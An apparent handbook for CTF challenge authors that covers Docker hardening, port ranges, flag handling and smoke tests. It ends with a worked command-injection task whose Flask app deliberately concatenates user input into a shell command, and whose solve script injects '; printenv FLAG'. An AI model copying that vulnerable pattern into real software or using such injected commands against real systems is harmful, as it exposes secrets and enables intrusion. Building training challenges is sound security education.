# Creating a CTF 2026 challenge — handbook for task authors

Welcome. This is everything you need to build a challenge that drops cleanly into our fleet.
Read it once, then keep the **Submission checklist** at the bottom open while you work.

**What you were given:** this folder. It contains this guide and a ready-to-run starter,
`challenge-template/`. You do **not** have our main repo, our fleet manager (`ctfctl`), or the
central port registry — and you don't need them. You build a self-contained challenge folder,
prove your own exploit works against it with plain `docker compose`, and hand the folder back.
We plug it into the fleet on our side.

You need **Docker** (with the Compose v2 plugin) and **Python 3** locally. That's it.

---

## 1. What you're building & the three golden rules

We run web challenges on **one Docker host**, with **shared instances** — every player hits the
*same* container for a task (there is no per-team copy), for up to ~1000 players. That shapes
almost every rule below.

Your challenge is **one independent `docker compose` project**. It knows nothing about the other
challenges and must never depend on them.

Three rules are non-negotiable. Everything else in this doc explains how to satisfy them:

1. **Secrets never touch the shared files or image layers.** The flag and any DB passwords live
   only in `flags.env` / `db.env`, which you keep out of your submission and send to us
   separately. They are injected into the container at *runtime*. Never write a flag into a
   Dockerfile, a source file, or any file you hand back.
2. **You propose a port; we own the registry.** Pick a free-looking port from your category's
   range (Section 5) and put it in `challenge.yml` + `.env`. We reconcile it against our central
   registry and tell you if it collides. Don't worry about global uniqueness — that's our job.
3. **The hardening contract applies to every service** (Section 4). Containers run locked down
   (non-root, read-only rootfs, dropped capabilities, resource limits) unless the image
   physically can't (LAMP), in which case you declare a documented exception.

Flag format is always `CTF{...}` — lowercase inner text, `snake_case`, e.g.
`CTF{alg_confusion_is_not_your_friend}`.

---

## 2. Quickstart — from zero to a passing task in 6 steps

Everything runs inside your copy of the template. No special tooling required.

```bash
# 1. Copy the starter. Slug = <category>-<name>, kebab-case.
cp -r challenge-template web-mytask
cd web-mytask

# 2. Fill in metadata + env. HOST_PORT in .env is your proposed port (see Section 5).
$EDITOR challenge.yml
cp .env.example .env
$EDITOR .env

# 3. Put your app in build/ (Dockerfile + source). The app must read FLAG from the environment.
$EDITOR build/app.py

# 4. Create the REAL flag. Keep flags.env OUT of your submission — send it to us separately.
cp flags.env.example flags.env
$EDITOR flags.env        # FLAG=CTF{...}

# 5. Build + run it locally.
docker compose up --build       # serves on http://127.0.0.1:<HOST_PORT>

# 6. Write the intended solve in solution/smoke_test.py, then run it (in a second shell):
$EDITOR solution/smoke_test.py
TARGET=http://127.0.0.1:<HOST_PORT> FLAGS_ENV="$PWD/flags.env" python3 solution/smoke_test.py
```

If that last command prints `PASS`, you have a working challenge. `docker compose down` stops it.
Section 8 walks through a complete real example end-to-end.

> `solution/smoke_test.py` needs the `requests` library (`pip install requests`). If your solve
> needs anything else, list it in `solution/requirements.txt` and mention it in your submission.

---

## 3. Anatomy of a challenge folder

Your copy of `challenge-template/` already has this shape:

```
web-mytask/
├── challenge.yml          # metadata (name, difficulty, proposed port, flag format, reset policy)
├── docker-compose.yml     # the service(s); already hardened — you rarely touch it
├── .env                   # NON-secret runtime vars (slug, category, HOST_PORT, image tag)
├── .env.example           # placeholder shape of .env
├── flags.env              # REAL flag  — you create it; DO NOT include it in the submission
├── flags.env.example      # placeholder (FLAG=CTF{REPLACE_ME})
├── db.env                 # REAL db creds — STATEFUL tasks only; also kept out of the submission
├── db.env.example         # placeholder (STATEFUL tasks only)
├── build/                 # everything COPY'd into the image
│   ├── Dockerfile
│   ├── app.py             # your app (any language/stack; the starter uses Flask)
│   └── requirements.txt
└── solution/
    └── smoke_test.py      # the intended exploit, the canary we run during the event
```

| File | In the submission? | Purpose |
|------|--------------------|---------|
| `challenge.yml` | ✅ yes | Human + scoreboard metadata. |
| `docker-compose.yml` | ✅ yes | How the service runs (ports, limits, hardening). |
| `.env` | ✅ yes | Non-secret vars. Safe to share. |
| `.env.example` | ✅ yes | Documents the shape of `.env`. |
| `flags.env` | ❌ **NO — send separately** | The real flag. |
| `flags.env.example` | ✅ yes | Placeholder so we know the shape. |
| `db.env` | ❌ **NO — send separately** | Real DB credentials (stateful only). |
| `db.env.example` | ✅ yes | Placeholder (stateful only). |
| `build/**` | ✅ yes | Your app + Dockerfile. **Must contain no secrets.** |
| `solution/**` | ✅ yes | The intended solve. |

Simplest way to package the submission: `zip -r web-mytask.zip web-mytask -x '*/flags.env' '*/db.env'`,
then send the flag/creds to us over a separate channel.

---

## 4. The hardening contract (non-negotiable)

Because instances are **shared by up to 1000 players**, a single exploited or runaway container
must not be able to harm the host or the other challenges. Every service you define gets all of
the following. The template already includes them — your job is to *not remove* them.

| Setting | What it looks like | Why it exists |
|---------|--------------------|---------------|
| Restart policy | `restart: unless-stopped` | A crashed/killed task self-heals; also re-drops the flag on restart. |
| Resource limits | `cpus`, `memory`, `pids` under `deploy.resources.limits` | One task can't monopolise CPU/RAM or fork-bomb the host and starve the others. |
| Log rotation | `json-file`, `max-size: 10m`, `max-file: 3` | 1000 players generate huge logs; capped so they can't fill the disk. |
| No privilege escalation | `security_opt: ["no-new-privileges:true"]` | A shell inside the container can't `setuid` its way to more power. |
| Drop capabilities | `cap_drop: ["ALL"]` | Removes Linux capabilities the app doesn't need. |
| Healthcheck | a `healthcheck:` block hitting your app | Our monitoring can tell "up" from "wedged". |
| Labels | `ctf.task`, `ctf.category`, `ctf.port` | Fleet tooling identifies containers. |
| Non-root | `user: "1000:1000"` + `USER 1000` in Dockerfile | If the app is popped, the attacker is not root. |
| Read-only rootfs | `read_only: true` + `tmpfs: [/tmp]` | The app image can't be modified at runtime; scratch writes go to a throwaway tmpfs. |

**DB services** get one extra rule: they go on an `internal: true` network and are **never**
published to the host. Players reach your app; your app reaches the DB; nobody reaches the DB
from outside. (See Section 6.)

### When you legitimately can't comply: `hardening_exceptions`

Some stock images (WordPress, Joomla — the LAMP stack) run their own entrypoint that needs a
writable rootfs and default capabilities. They physically cannot run with `read_only`,
`user: 1000`, or `cap_drop: ALL`. That's allowed **only** for such images, and you must:

- keep everything you *can* (`no-new-privileges`, limits, log rotation, internal DB network);
- list what you dropped in `challenge.yml` under `hardening_exceptions`, e.g.
  `hardening_exceptions: ["read_only", "user", "cap_drop"]`.

If your app is something you wrote yourself (Flask/Node/Go/etc.), there is **no excuse** — it
runs fully locked down like the template.

---

## 5. Ports — propose one from your range

Pick a host port from the range for your category and put the *same* number in both
`challenge.yml` (`proposed_port`) and `.env` (`HOST_PORT`):

| Category | Host-port range |
|----------|-----------------|
| web | 10000–10999 |
| pwn | 11000–11999 |
| crypto | 12000–12999 |
| misc / rev / forensics | 13000+ |

Rules:

- The number in `challenge.yml` and the `HOST_PORT` in `.env` **must match each other**.
- `internal_ports` in `challenge.yml` are ports used only *between* containers (or inside one)
  and never published — list them for documentation, leave the list empty if none.
- You don't have access to our central registry, so **don't worry about global collisions** —
  just avoid something obviously reserved. When you submit, we reconcile your proposed port
  against the registry and tell you if it needs to change.

The *left* side of the compose `ports:` mapping is the host port; the *right* side is whatever
port your app listens on **inside** the container (5000, 80, 5555, …) and can be anything you
like. The starter listens on `5000` inside.

---

## 6. Stateless vs stateful — which are you?

**Stateless** (preferred): the challenge has no data players can permanently damage. Restarting
the container gives a pristine task. Almost all self-written app challenges are stateless. Set
`stateful: false`, `reset.policy: none`. Nothing else to do — `restart: unless-stopped` heals it.

**Stateful**: the challenge has a database or writable state players share and can trash
(defacement, deleting the flag row, filling uploads). If so:

- add a DB service on an `internal: true` network, **not** published to the host;
- add `db.env` (kept out of the submission) + `db.env.example` for its credentials;
- set `stateful: true` and `reset.policy: scheduled` in `challenge.yml`;
- say so in your submission notes, so we add your slug to the auto-reset schedule that
  periodically wipes the volume and re-provisions from scratch.

**Provisioning must be idempotent.** Because of shared players and periodic resets, your task may
be (re)provisioned many times. Do the setup with a **one-shot init container** that checks "is
this already installed?" and exits cleanly if so — never a host-side script that assumes a blank
slate. If you need a reference for the pattern, ask us and we'll share the relevant example
folder; the short version is: a small init service (e.g. `php:8.1-cli` or a `wp-cli` one-shot)
that runs a `provision.sh` guarded by an "already done?" check.

---

## 7. The smoke-test contract

`solution/smoke_test.py` is the intended solve. It's how we prove the challenge is solvable and
stays solvable during the event (we run it as a canary). It must run against a **live** container
and be driven entirely by two environment variables:

- `TARGET` — the base URL, e.g. `http://127.0.0.1:10010`.
- `FLAGS_ENV` — path to the challenge's `flags.env`, so the test can read the expected flag.

You set these by hand when testing locally (see the quickstart); our fleet tooling sets them the
same way during the event, so the *same script* works on both sides. Contract:

- The test performs the **intended exploit path** end-to-end and captures the flag.
- **Exit 0 = PASS**, non-zero = FAIL. Print the captured flag so failures are debuggable.
- Compare the captured flag to the expected one from `FLAGS_ENV` when available.
- Only the stdlib + `requests` are assumed present. Anything more goes in
  `solution/requirements.txt`, and you mention it in the submission.

Don't test liveness only — test the *solve*. If the full chain needs an attacker-hosted component
(e.g. an out-of-band DTD), the smoke test may check provisioning/liveness and you keep the full
chain in `solution/` as scripts — but say so in `challenge.yml` notes.

---

## 8. Full worked example — `web-pinger` (OS command injection)

This builds a complete, brand-new challenge from a copy of the template to a passing test. It's a
deliberately simple **command-injection** task. Copy this shape for your own challenge.

> **This exact challenge is already on disk** at `examples/web-pinger/` — run it as-is to see a
> passing task, or `cp -r examples/web-pinger web-mytask` and start from it. The code blocks below
> are that folder's files, walked through one at a time.

> The port `10010` used here is illustrative — pick your own from the web range.

### 8.1 Scaffold

```bash
cp -r challenge-template web-pinger
cd web-pinger
```

### 8.2 `challenge.yml`

```yaml
name: "Pinger"
slug: web-pinger
category: web
difficulty: easy
author: you@csec.uz
proposed_port: 10010          # same number as HOST_PORT in .env
internal_ports: []
image: ctf/web-pinger:1.0.0
stateful: false
healthcheck_url: "http://TARGET/"
flag_format: "CTF{...}"
solution:
  cmd: "python3 solution/smoke_test.py"
reset:
  policy: none
hardening_exceptions: []      # none — this is our own Flask app, fully locked down
notes: "Network diagnostics page shells out to `ping`; host param is injectable -> RCE, flag in env."
```

### 8.3 `.env` (copy from `.env.example`, then edit)

```ini
CTF_SLUG=web-pinger
CTF_CATEGORY=web
HOST_PORT=10010
IMAGE=ctf/web-pinger:1.0.0
```

### 8.4 The real flag (kept out of the submission)

```bash
cp flags.env.example flags.env
echo 'FLAG=CTF{n3ver_sh3ll_out_with_user_1nput}' > flags.env
```

### 8.5 `build/app.py`

The vulnerability: the `host` parameter is concatenated into a shell command. The flag is read
from the environment (never baked into the image), so the intended solve is to inject a command
that prints it.

```python
# app.py — Pinger network diagnostics
import os
import subprocess
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Flag is injected at runtime via flags.env — NEVER hardcode it here.
FLAG = os.environ.get("FLAG", "CTF{local_test_flag}")

PAGE = """
<!doctype html>
<title>Pinger</title>
<h1>Network diagnostics</h1>
<form action="/ping" method="get">
  <input name="host" placeholder="8.8.8.8" value="{{ host }}">
  <button>Ping</button>
</form>
<pre>{{ output }}</pre>
"""


@app.route("/")
def index():
    return render_template_string(PAGE, host="", output="")


@app.route("/ping")
def ping():
    host = request.args.get("host", "")
    # BUG (intended): user input is concatenated into a shell command.
    # `ping -c 1 <host>` becomes injectable, e.g. host = "8.8.8.8; printenv FLAG".
    cmd = "ping -c 1 " + host
    try:
        output = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=5
        ).stdout
    except subprocess.TimeoutExpired:
        output = "timed out"
    return render_template_string(PAGE, host=host, output=output)


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

> Note we use `render_template_string` only with fixed template text and pass user input as a
> *variable* (`host=host`), so there is no accidental SSTI — the intended bug is the shell
> injection, and keeping it the *only* bug is part of good challenge design.

### 8.6 `build/requirements.txt`

```
flask==3.1.0
```

### 8.7 `build/Dockerfile`

Straight from the template — non-root, no flag baked in, reads `FLAG` from the environment at
runtime.

```dockerfile
FROM python:3.12-slim

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY app.py .

# Run as non-root (matches `user: 1000:1000` in compose).
RUN useradd -u 1000 -m app || true
USER 1000

# NOTE: no `ENV FLAG=...` — the flag is injected at runtime via flags.env.
EXPOSE 5000
CMD ["python3", "app.py"]
```

### 8.8 `docker-compose.yml`

This is the template **unchanged** — slug/port/image come from `.env`, and the hardening is
already correct, so you don't edit it for a single-service Flask app. (It's reproduced in the
template folder; no need to retype it.)

### 8.9 `solution/smoke_test.py`

The intended solve: inject `; printenv FLAG` into the `host` parameter, scrape the flag out of
the command output, and compare it to the expected flag.

```python
#!/usr/bin/env python3
"""
web-pinger end-to-end smoke test.
Path: OS command injection in the `host` param of /ping -> `printenv FLAG` -> capture flag.
Exit 0 = PASS.
"""
import os
import re
import sys

import requests

TARGET = os.environ.get("TARGET", "http://127.0.0.1:10010").rstrip("/")


def expected_flag():
    path = os.environ.get("FLAGS_ENV", "")
    if path and os.path.exists(path):
        for line in open(path):
            m = re.match(r"\s*FLAG=(.*)", line)
            if m:
                return m.group(1).strip()
    return None


def solve():
    # Inject a second command after the ping. `; printenv FLAG` prints the flag from the env.
    r = requests.get(
        f"{TARGET}/ping",
        params={"host": "127.0.0.1; printenv FLAG"},
        timeout=10,
    )
    m = re.search(r"CTF\{[^}]*\}", r.text)
    return m.group(0) if m else ""


def main():
    got = solve()
    want = expected_flag()
    print(f"[captured] {got!r}")
    if got and (want is None or got == want):
        print("PASS")
        return 0
    print(f"FAIL expected={want!r}")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

### 8.10 Build, run, and prove it

```bash
docker compose up --build -d                         # build + start in the background
TARGET=http://127.0.0.1:10010 FLAGS_ENV="$PWD/flags.env" \
    python3 solution/smoke_test.py                   # run the intended solve
```

Expected output:

```
[captured] 'CTF{n3ver_sh3ll_out_with_user_1nput}'
PASS
```

Then `docker compose down` to stop it. That's a complete, compliant challenge, ready to submit.

---

## 9. Submission checklist

Run through this before handing the challenge back. All must be true:

- [ ] `docker compose up --build` starts the task with no errors, and `http://127.0.0.1:<HOST_PORT>/`
      responds.
- [ ] `TARGET=... FLAGS_ENV=... python3 solution/smoke_test.py` prints `PASS` (the smoke test
      solves via the intended path).
- [ ] The number in `challenge.yml` matches `HOST_PORT` in `.env`, and it's within your
      category's range.
- [ ] `challenge.yml` is complete: name, slug, category, difficulty, author, proposed port, image
      tag (pinned, e.g. `:1.0.0`), stateful flag, reset policy, flag_format, notes.
- [ ] Every service keeps the full hardening contract (Section 4); any drop is a LAMP image and is
      listed in `hardening_exceptions`.
- [ ] No flag or credential appears in `build/`, the Dockerfile, `.env`, or any file you're
      sending. Quick check: `grep -rn "CTF{" .` finds it only in `solution/` comments, if anywhere.
- [ ] Stateful only: DB is on an `internal: true` network and **not** published; provisioning is
      idempotent (start twice, still solvable).
- [ ] Package **without** `flags.env` / `db.env`
      (`zip -r <slug>.zip <slug> -x '*/flags.env' '*/db.env'`) and send the flag + any DB creds
      to us over a separate channel.

---

## 10. Common mistakes (don't be these)

- **Flag baked into the image or source.** It ends up in shippable image layers players can
  `docker pull`/inspect. Read it from `os.environ["FLAG"]` (or your language's equivalent) and
  inject via `flags.env`.
- **Including `flags.env` / `db.env` in the submission.** Send secrets separately; ship only the
  `*.env.example` placeholders.
- **Port mismatch.** The number in `challenge.yml` and `HOST_PORT` in `.env` must be identical.
- **`read_only` breaks your app.** If your app writes files at runtime, point those writes at
  `/tmp` (already a tmpfs). Only drop `read_only` if the image genuinely can't cope — and then
  document it as a `hardening_exception`.
- **Publishing a database to the host.** DBs stay on the `internal: true` network. Players talk to
  your app, never the DB.
- **Non-idempotent provisioning.** A setup script that assumes a fresh DB will break on the
  periodic reset. Check-then-act in a one-shot init container.
- **A smoke test that only checks liveness.** It must actually capture the flag via the intended
  exploit, or it can't act as a canary during the event.
- **A near-duplicate of an existing challenge.** If you're proposing a common bug class (JWT
  confusion, SSTI, XXE), check with us first — we may already have one. Bring something fresh.

---

## Questions?

Anything unclear, or you need a reference for a stateful/LAMP task or the reset flow — ask the
fleet team (o.ruzimatov@csec.uz). We'd rather answer up front than bounce a submission.
